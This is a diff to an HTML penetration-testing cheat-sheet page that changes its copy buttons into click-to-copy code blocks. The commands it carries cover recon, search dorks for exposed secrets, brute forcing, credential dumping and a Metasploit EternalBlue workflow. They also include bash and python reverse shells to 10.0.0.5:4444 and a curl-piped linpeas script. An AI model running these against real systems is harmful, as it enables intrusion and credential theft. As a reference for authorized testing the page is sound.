@@ -110,33 +110,59 @@
         html[dir="rtl"] .header-bar {
             flex-direction: row-reverse;
         }
-        /* FIX for RTL: copy button is on the left */
-        html[dir="rtl"] .copy-btn { right: auto; left: 10px; }
+        /* FIX for RTL: copy feedback is on the left */
+        html[dir="rtl"] .copy-feedback { right: auto; left: 10px; }
         html[dir="rtl"] .warning {
             border-left: none;
-            border-right: 4px solid #eab308;
+            border-right: 4px solid var(--accent);
         }
         html[dir="rtl"] .toggle-icon { margin-right: auto; margin-left: 0; padding-right: 10px; padding-left: 0; }
         /* END RTL adjustments */
 
-        pre{border-radius:8px;margin:10px 0;padding:12px;position:relative;background:var(--code-bg);overflow:auto;border:1px solid var(--accent)}
+        /* PRE STYLES: Now clickable */
+        pre{
+            border-radius:8px;
+            margin:10px 0;
+            padding:12px;
+            position:relative;
+            background:var(--code-bg);
+            overflow:auto;
+            border:1px solid var(--accent);
+            
+            /* NEW: Click-to-copy cue */
+            cursor: copy; 
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+        pre:hover {
+            background: #2a2c34; /* Slightly lighter background on hover */
+            box-shadow: 0 0 5px rgba(0, 255, 65, 0.5); /* Subtle neon glow on hover */
+        }
         
-        /* === FIX: Change position from absolute to sticky so it doesn't scroll with the PRE content === */
-        .copy-btn{
-            position: sticky; /* KEY FIX */
+        /* === NEW: The 'Copied!' feedback element === */
+        .copy-feedback {
+            position: sticky; /* Keeps it in the visible area of the scrolling container */
             right: 10px;
             top: 10px; /* Offset from the top of the visible container */
-            z-index: 10; /* Ensure it is above the code text */
-            background:var(--accent);
-            color:#000;
-            border:none;
-            padding:6px 8px;
-            border-radius:6px;
-            font-size:12px;
-            cursor:pointer; 
-            transition: background-color 0.3s;
+            z-index: 10;
+            background: var(--accent); /* Neon Green background */
+            color: #000;
+            border: none;
+            padding: 6px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: bold;
+            opacity: 0; /* Hidden by default */
+            transition: opacity 0.3s;
+            pointer-events: none; /* Allows the click to pass through to the PRE */
         }
-        .copy-btn:hover { background-color: var(--accent-2); }
+        .copy-feedback.visible {
+            opacity: 1; /* Shows up on copy success */
+        }
+
+        /* Hide old copy button if any stray ones exist */
+        .copy-btn {
+            display: none !important;
+        }
 
         .warning{border:1px solid var(--accent);border-left:4px solid var(--accent);background:rgba(0,255,65,0.07);color:var(--muted);padding:12px;border-radius:8px}
 
@@ -211,25 +237,43 @@
             <p class="command-desc" data-i18n="section1CommandDesc">Commands gather domain info, DNS records, HTTP headers, and passive certificate/host data.</p>
             
             <p class="command-desc"># Set target</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>TARGET=example.com</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>TARGET=example.com</code>
+            </pre>
 
             <p class="command-desc">WHOIS lookup</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>whois $TARGET</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>whois $TARGET</code>
+            </pre>
 
             <p class="command-desc">DNS: A + MX + NS records</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>dig +noall +answer $TARGET A
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>dig +noall +answer $TARGET A
 dig +noall +answer $TARGET MX
-dig +noall +answer $TARGET NS</code></pre>
+dig +noall +answer $TARGET NS</code>
+            </pre>
 
             <p class="command-desc">HTTP headers check</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -I -L --max-redirs 5 https://$TARGET</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl -I -L --max-redirs 5 https://$TARGET</code>
+            </pre>
 
             <p class="command-desc">Certificate names (crt.sh)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u</code>
+            </pre>
 
             <p class="command-desc">Passive OSINT (AUTHORIZED USE ONLY)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>theharvester -d example.com -b google,bing,linkedin -l 500
-shodan host 1.2.3.4</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>theharvester -d example.com -b google,bing,linkedin -l 500
+shodan host 1.2.3.4</code>
+            </pre>
         </div>
     </div>
     
@@ -244,21 +288,36 @@ shodan host 1.2.3.4</code></pre>
             <p class="command-desc" data-i18n="section2CommandDesc">These dorks work across all major search engines and are crucial for external reconnaissance.</p>
             
             <p class="command-desc"># Find sensitive files (.pdf, .xls) on target domain</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>site:target.com filetype:pdf confidential
-site:target.com filetype:xls password</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>site:target.com filetype:pdf confidential
+site:target.com filetype:xls password</code>
+            </pre>
 
             <p class="command-desc">Find public login/admin panels</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>intitle:"login page" inurl:admin site:target.com</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>intitle:"login page" inurl:admin site:target.com</code>
+            </pre>
 
             <p class="command-desc">Find exposed configuration or log files</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>inurl:wp-config.php OR inurl:.env filetype:txt
-intitle:"index of /" log</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>inurl:wp-config.php OR inurl:.env filetype:txt
+intitle:"index of /" log</code>
+            </pre>
 
             <p class="command-desc">Find cached pages to check for old data exposure</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>cache:https://target.com/page-with-old-data</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>cache:https://target.com/page-with-old-data</code>
+            </pre>
 
             <p class="command-desc">Restrict results to a specific file type AND title match</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>intitle:"report" filetype:docx site:target.com</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>intitle:"report" filetype:docx site:target.com</code>
+            </pre>
         </div>
     </div>
     
@@ -273,19 +332,34 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section3CommandDesc">These checks help find security issues caused by poor communication between developers and search engine crawlers.</p>
 
             <p class="command-desc"># Check for security-sensitive disallow rules in robots.txt</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s https://example.com/robots.txt | grep -i "disallow"</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl -s https://example.com/robots.txt | grep -i "disallow"</code>
+            </pre>
 
             <p class="command-desc">Identify sensitive meta robots tags (e.g., noindex on login forms) - Should return "noindex" for sensitive, non-public pages.
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>grep -i 'meta name="robots"' page_source.html</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>grep -i 'meta name="robots"' page_source.html</code>
+            </pre>
 
             <p class="command-desc">Check for canonical tag misconfigurations (points to non-HTTPS, wrong domain, or internal staging) - Command run locally on page source:</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>grep -i '&lt;link rel="canonical"' page_source.html</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>grep -i '&lt;link rel="canonical"' page_source.html</code>
+            </pre>
 
             <p class="command-desc">Check for unintended parameter indexation (e.g., session IDs in URL) - Use a dork to check if Google/Bing indexed URLs with sensitive parameters:</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>site:example.com inurl:sessionid= OR inurl:PHPSESSID=</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>site:example.com inurl:sessionid= OR inurl:PHPSESSID=</code>
+            </pre>
 
             <p class="command-desc">Use specialized tools to find indexation issues (e.g., using a sitemap scanner like Scrape-It)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>scrape-it --sitemap https://example.com/sitemap.xml --check-robots</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>scrape-it --sitemap https://example.com/sitemap.xml --check-robots</code>
+            </pre>
         </div>
     </div>
     
@@ -300,13 +374,22 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section4CommandDesc">Uses Amass and Subfinder for comprehensive target scope, combining passive and active sources.</p>
             
             <p class="command-desc"># Amass (passive + active + brute)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>amass enum -d example.com -o amass.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>amass enum -d example.com -o amass.txt</code>
+            </pre>
 
             <p class="command-desc">Subfinder (fast passive)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>subfinder -d example.com -o subfinder.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>subfinder -d example.com -o subfinder.txt</code>
+            </pre>
 
             <p class="command-desc">DNS recon</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>dnsrecon -d example.com -t std,brt,srv</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>dnsrecon -d example.com -t std,brt,srv</code>
+            </pre>
         </div>
     </div>
     
@@ -321,13 +404,22 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section5CommandDesc">The Nmap command is a safe, thorough pattern: default scripts, service versions, all ports, fast timing, and output formats.</p>
             
             <p class="command-desc"># Nmap (version, default scripts, full ports)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24</code>
+            </pre>
 
             <p class="command-desc">Host discovery (ping scan)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nmap -sn 192.0.2.0/24</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nmap -sn 192.0.2.0/24</code>
+            </pre>
 
             <p class="command-desc">Banner grab with netcat (HTTP 80)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc -vz 192.0.2.10 80</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nc -vz 192.0.2.10 80</code>
+            </pre>
         </div>
     </div>
     
@@ -342,10 +434,16 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section6CommandDesc">Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).</p>
             
             <p class="command-desc"># ffuf (directory/file fuzzing)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json</code>
+            </pre>
 
             <p class="command-desc">gobuster (dir + vhost)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt</code>
+            </pre>
         </div>
     </div>
     
@@ -360,16 +458,28 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section7CommandDesc">Tools for checking common application layer flaws and enumerating hidden parameters.</p>
             
             <p class="command-desc"># nikto (webserver checks)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nikto -h https://example.com -output nikto.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nikto -h https://example.com -output nikto.txt</code>
+            </pre>
 
             <p class="command-desc">sqlmap (ONLY in-scope & lab)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>sqlmap -u "https://example.com/vuln.php?id=1" --batch --dbs</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>sqlmap -u "https://example.com/vuln.php?id=1" --batch --dbs</code>
+            </pre>
 
             <p class="command-desc">XSS testing (lab only)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>xsstrike -u "https://example.com/page?param=1"</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>xsstrike -u "https://example.com/page?param=1"</code>
+            </pre>
 
             <p class="command-desc">parameter discovery</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>arjun -u "https://example.com/page" -o arjun.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>arjun -u "https://example.com/page" -o arjun.txt</code>
+            </pre>
         </div>
     </div>
     
@@ -384,16 +494,28 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section8CommandDesc">Uses open-source tools for infrastructure scanning (Nuclei) and dependency analysis (Syft/Grype).</p>
             
             <p class="command-desc"># nuclei (fast templates)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nuclei -l hosts.txt -t cves/ -o nuclei_results.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nuclei -l hosts.txt -t cves/ -o nuclei_results.txt</code>
+            </pre>
 
             <p class="command-desc">syft -> generate SBOM (Software Bill of Materials)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>syft packages dir:./project -o json > sbom.json</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>syft packages dir:./project -o json > sbom.json</code>
+            </pre>
 
             <p class="command-desc">grype -> scan SBOM</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>grype sbom:sbom.json</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>grype sbom:sbom.json</code>
+            </pre>
 
             <p class="command-desc">query NVD (example)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .</code>
+            </pre>
         </div>
     </div>
     
@@ -408,16 +530,28 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section9CommandDesc">Standard tools for credential testing, hash cracking, and AD environment assessment.</p>
             
             <p class="command-desc"># hydra (online bruteforce) - AUTHORIZED ONLY</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt</code>
+            </pre>
 
             <p class="command-desc">john / hashcat (offline cracking)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt</code>
+            </pre>
 
             <p class="command-desc">impacket (examples: secretsdump)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets</code>
+            </pre>
 
             <p class="command-desc">BloodHound collection</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip</code>
+            </pre>
         </div>
     </div>
     
@@ -432,26 +566,44 @@ intitle:"index of /" log</code></pre>
             <p class="command-desc" data-i18n="section10CommandDesc">A template workflow for using auxiliary and exploit modules in the Metasploit console.</p>
             
             <p class="command-desc"># start msfconsole</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfconsole</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>msfconsole</code>
+            </pre>
 
             <p class="command-desc">search</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>search cve:2017-0143
-search type:exploit platform:windows smb</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>search cve:2017-0143
+search type:exploit platform:windows smb</code>
+            </pre>
 
             <p class="command-desc">use exploit</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+            </pre>
 
             <p class="command-desc">show/set options</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>show options
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>show options
 set RHOSTS 192.168.1.0/24
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.0.0.5</code></pre>
+set LHOST 10.0.0.5</code>
+            </pre>
 
             <p class="command-desc">check (non-destructive)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>check</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>check</code>
+            </pre>
 
             <p class="command-desc">exploit (authorized/lab only)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>exploit</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>exploit</code>
+            </pre>
         </div>
     </div>
     
@@ -466,19 +618,34 @@ set LHOST 10.0.0.5</code></pre>
             <p class="command-desc" data-i18n="section11CommandDesc">Essential commands for establishing and maintaining remote access and internal host reconnaissance.</p>
             
             <p class="command-desc"># netcat listener (catch reverse shells)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc -lvnp 4444</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nc -lvnp 4444</code>
+            </pre>
 
             <p class="command-desc">bash reverse shell</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>bash -i >& /dev/tcp/10.0.0.5/4444 0>&1</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>bash -i >& /dev/tcp/10.0.0.5/4444 0>&1</code>
+            </pre>
 
             <p class="command-desc">python reverse shell</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</code>
+            </pre>
 
             <p class="command-desc">linux enumeration (lab)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh</code>
+            </pre>
 
             <p class="command-desc">windows enumeration</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>.\winpeas.exe</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>.\winpeas.exe</code>
+            </pre>
         </div>
     </div>
     
@@ -493,16 +660,28 @@ set LHOST 10.0.0.5</code></pre>
             <p class="command-desc" data-i18n="section12CommandDesc">Commands for network diagnostics and assessing the cryptographic strength of web endpoints.</p>
             
             <p class="command-desc"># tcpdump (capture 1000 packets on eth0)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>tcpdump -i eth0 -w capture.pcap -c 1000</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>tcpdump -i eth0 -w capture.pcap -c 1000</code>
+            </pre>
 
             <p class="command-desc">tshark read (filter HTTP)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri</code>
+            </pre>
 
             <p class="command-desc">quick cert info</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>openssl s_client -connect example.com:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>openssl s_client -connect example.com:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text</code>
+            </pre>
 
             <p class="command-desc">sslyze (comprehensive TLS scan)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>sslyze --regular example.com:443</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>sslyze --regular example.com:443</code>
+            </pre>
         </div>
     </div>
     
@@ -517,14 +696,23 @@ set LHOST 10.0.0.5</code></pre>
             <p class="command-desc" data-i18n="section13CommandDesc">Emphasizes local search (searchsploit) and the use of network-isolated containers to prevent lateral movement.</p>
             
             <p class="command-desc"># searchsploit</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>searchsploit "CVE-2021-44228"
-searchsploit -m 49993 # copy exploit by EDB ID</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>searchsploit "CVE-2021-44228"
+searchsploit -m 49993 # copy exploit by EDB ID</code>
+            </pre>
 
             <p class="command-desc">fetch PoC (read-only)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -sL "https://raw.githubusercontent.com/user/repo/branch/poc.py" -o /tmp/poc.py</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl -sL "https://raw.githubusercontent.com/user/repo/branch/poc.py" -o /tmp/poc.py</code>
+            </pre>
 
             <p class="command-desc">run PoC inside an isolated, no-network container (safest approach)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"</code>
+            </pre>
         </div>
     </div>
     
@@ -539,18 +727,30 @@ searchsploit -m 49993 # copy exploit by EDB ID</code></pre>
             <p class="command-desc" data-i18n="section14CommandDesc">Tools used for analyzing executable file headers, assembly code, and preparing buffer overflow exploits.</p>
             
             <p class="command-desc"># ELF inspection</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>readelf -h binary
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>readelf -h binary
 objdump -d binary | less
-strings binary</code></pre>
+strings binary</code>
+            </pre>
 
             <p class="command-desc">radare2</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>r2 -AA binary</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>r2 -AA binary</code>
+            </pre>
 
             <p class="command-desc">ropgadget (search for pop/ret gadgets)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ropgadget --binary binary --only "pop|ret" > gadgets.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>ropgadget --binary binary --only "pop|ret" > gadgets.txt</code>
+            </pre>
 
             <p class="command-desc">gdb + pwndbg (start debugging session)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>gdb -q ./binary</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>gdb -q ./binary</code>
+            </pre>
         </div>
     </div>
     
@@ -565,10 +765,16 @@ strings binary</code></pre>
             <p class="command-desc" data-i18n="section15CommandDesc">AFL is used for finding crashes in C/C++ binaries; Wfuzz is used for black-box web fuzzing.</p>
             
             <p class="command-desc"># AFL (instrumented binary)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>afl-fuzz -i in_dir -o out_dir -- ./target @@</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>afl-fuzz -i in_dir -o out_dir -- ./target @@</code>
+            </pre>
 
             <p class="command-desc">wfuzz for HTTP (parameter discovery)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.com/vuln?FUZZ=1"</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.com/vuln?FUZZ=1"</code>
+            </pre>
         </div>
     </div>
     
@@ -583,17 +789,29 @@ strings binary</code></pre>
             <p class="command-desc" data-i18n="section16CommandDesc">Commands for static and dynamic analysis of Android apps and embedded system binaries.</p>
             
             <p class="command-desc"># android decompile / inspect (apktool)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>apktool d app.apk -o app_src</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>apktool d app.apk -o app_src</code>
+            </pre>
 
             <p class="command-desc">android decompile / inspect (jadx)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>jadx -d out app.apk</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>jadx -d out app.apk</code>
+            </pre>
 
             <p class="command-desc">frida (dynamic hooks) - authorized/lab only</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>frida -U -f com.example.app -l script.js --no-pause</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>frida -U -f com.example.app -l script.js --no-pause</code>
+            </pre>
 
             <p class="command-desc">firmware extraction</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>binwalk -e firmware.bin
-strings firmware.bin | grep -i password</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>binwalk -e firmware.bin
